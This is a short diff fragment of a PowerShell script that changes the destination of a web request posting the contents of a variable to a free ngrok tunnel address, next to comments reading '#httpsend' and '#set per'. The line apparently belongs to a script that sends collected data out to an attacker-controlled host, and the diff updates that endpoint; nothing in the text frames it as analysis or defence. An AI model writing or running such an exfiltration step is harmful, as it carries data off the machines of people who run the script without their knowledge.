@@ -133,7 +133,7 @@ Start-Sleep -Seconds 3
 
 #httpsend
 
-    $Response = Invoke-WebRequest -Method Post -URI https://1742-70-31-164-93.ngrok-free.app -body $var -UseBasicParsing
+    $Response = Invoke-WebRequest -Method Post -URI https://293c-70-31-164-93.ngrok-free.app -body $var -UseBasicParsing
 
 #set per
 
